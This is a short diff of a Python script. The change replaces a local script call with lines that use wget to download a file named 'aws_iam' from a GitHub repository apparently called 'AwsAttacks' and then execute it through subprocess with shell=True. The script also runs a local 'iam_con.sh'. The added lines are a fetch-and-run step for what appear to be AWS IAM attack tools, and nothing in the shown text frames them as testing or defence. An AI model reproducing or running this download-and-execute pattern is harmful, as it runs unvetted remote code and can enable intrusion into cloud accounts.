@@ -7,12 +7,12 @@ import random
 import os
 
 url = 'https://raw.githubusercontent.com/SoOM3a/AwsAttacks/refs/heads/main/aws_iam'
-local_filename = 'aws.sh'
-
 
 
 # Command with shell=True (use with caution)
-result = subprocess.run('./aws.sh', shell=True, capture_output=True, text=True)
+result = subprocess.run(f'wget -O aws_iam {url}', shell=True, capture_output=True, text=True)
+print(result.stdout)
+result = subprocess.run('./aws_iam', shell=True, capture_output=True, text=True)
 print(result.stdout)
 #./iam_con.sh
 result = subprocess.run('./iam_con.sh', shell=True, capture_output=True, text=True)
